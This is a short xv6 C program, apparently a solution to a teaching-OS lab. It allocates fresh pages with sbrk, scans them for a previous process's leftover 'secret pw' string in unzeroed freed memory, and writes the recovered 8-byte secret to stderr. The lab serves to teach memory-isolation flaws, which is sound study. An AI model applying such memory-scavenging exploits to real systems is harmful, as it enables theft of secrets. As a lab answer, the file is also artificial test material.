#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
strncmp(const char *p, const char *q, uint n)
{
  while(n > 0 && *p && *p == *q)
    n--, p++, q++;
  if(n == 0)
    return 0;
  return (uchar)*p - (uchar)*q;
}

int
main(int argc, char *argv[])
{
  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)

  const char *prefix = "my very very very secret pw is: ";
  // sizeof(ptr) chars are overwritten
  const uint offset = sizeof(void *); 

  char *start = sbrk(PGSIZE*32);
  for (int i = 0; i < 32; i++) {
    char *page_start = start + i * PGSIZE;
    if (strncmp(page_start+offset, prefix+offset, strlen(prefix)-offset) == 0) {
      write(2, page_start + 32, 8);
      exit(0);
    }
  }
  exit(1);
}
